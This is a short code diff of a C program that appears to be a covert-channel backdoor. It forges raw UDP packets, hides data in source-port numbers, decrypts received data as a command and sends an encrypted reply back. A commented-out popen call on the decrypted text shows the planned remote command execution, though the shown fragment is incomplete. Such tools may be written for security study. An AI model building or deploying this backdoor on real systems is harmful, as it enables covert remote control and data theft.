@@ -230,7 +230,6 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
         /* Away we go.... */
         sendto(send_socket, &send_udp, 28, 0, (struct sockaddr *)&sin, sizeof(sin));
-        // printf("Sending Data: %c\n", ch);
 
         close(send_socket);
     }
@@ -264,7 +263,6 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     int temp = 0;
     int size = 0;
     int packet_counter = 0;
-    // bool open = true;
 
     while (1) /* read packet loop */
     {
@@ -294,7 +292,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                 {
                     temp = ntohs(recv_packet.udp.source);
                     sprintf((commandBuffer + packet_counter), "%d", temp);
-                    // memcpy(commandBuffer[packet_counter], c, 1);
+
                     fprintf(stdout, "%d", temp);
                     packet_counter++;
                 }
@@ -306,15 +304,16 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                     fprintf(stdout, "%d \n%s\n", decryptedtext_len, decryptedtext);
 
+                    // Read
                     // fp = popen(decryptedtext, "r");
 
-                    // Read then send
+                    // Send
                     int cypher_len = 0;
                     unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
                     cypher_len = forgepacket(ciphertext);
-                    client(source_addr, dest_host, dest_port, ciphertext, cypher_len);
+                    client(source_addr, dest_addr, dest_port, ciphertext, cypher_len);
 
-                    // open = false;
+                    // Reset Counters
                     packet_counter = 0;
                     size = 0;
                 }
